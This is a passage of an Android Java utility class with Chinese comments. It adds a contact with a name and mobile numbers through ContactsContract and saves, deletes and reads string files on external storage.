        Uri rawContactUri = mContext.getContentResolver().insert(ContactsContract.RawContacts.CONTENT_URI, values);
        long rawContactId = ContentUris.parseId(rawContactUri);
        values.clear();

        values.put(ContactsContract.Contacts.Data.RAW_CONTACT_ID, rawContactId);
        // 内容类型
        values.put(ContactsContract.Contacts.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE);
        // 联系人名字
        values.put(ContactsContract.CommonDataKinds.StructuredName.GIVEN_NAME, name);
        // 向联系人URI添加联系人名字
        mContext.getContentResolver().insert(ContactsContract.Data.CONTENT_URI, values);

        for (String number : phoneNumber) {
            values.clear();
            values.put(ContactsContract.Data.RAW_CONTACT_ID, rawContactId);
            values.put(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE);
            values.put(ContactsContract.CommonDataKinds.Phone.NUMBER, number);
            values.put(ContactsContract.CommonDataKinds.Phone.TYPE, ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE);
            mContext.getContentResolver().insert(ContactsContract.Data.CONTENT_URI, values);
        }
    }

    /**
     * 字符串保存到手机内存设备中
     *
     * @param str
     */
    public static void saveFile(String str, String fileName) {
        // 创建String对象保存文件名路径
        try {
            // 创建指定路径的文件
            File file = new File(Environment.getExternalStorageDirectory(), fileName);
            // 如果文件不存在
            if (file.exists()) {
                // 创建新的空文件
                file.delete();
            }
            file.createNewFile();
            // 获取文件的输出流对象
            FileOutputStream outStream = new FileOutputStream(file);
            // 获取字符串对象的byte数组并写入文件流
            outStream.write(str.getBytes());
            // 最后关闭文件输出流
            outStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 删除已存储的文件
     */
    public static void deletefile(String fileName) {
        try {
            // 找到文件所在的路径并删除该文件
            File file = new File(Environment.getExternalStorageDirectory(), fileName);
            file.delete();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 读取文件里面的内容
     *
     * @return
     */
    public static String getFile(String fileName) {
        try {
            // 创建文件
            File file = new File(Environment.getExternalStorageDirectory(), fileName);
            // 创建FileInputStream对象
            FileInputStream fis = new FileInputStream(file);
            // 创建字节数组 每次缓冲1M
            byte[] b = new byte[1024];
            int len = 0;// 一次读取1024字节大小，没有数据后返回-1.
            // 创建ByteArrayOutputStream对象
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            // 一次读取1024个字节，然后往字符输出流中写读取的字节数
            while ((len = fis.read(b)) != -1) {
                baos.write(b, 0, len);
            }
            // 将读取的字节总数生成字节数组
            byte[] data = baos.toByteArray();
            // 关闭字节输出流
            baos.close();
            // 关闭文件输入流
            fis.close();
            // 返回字符串对象
            return new String(data);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
}
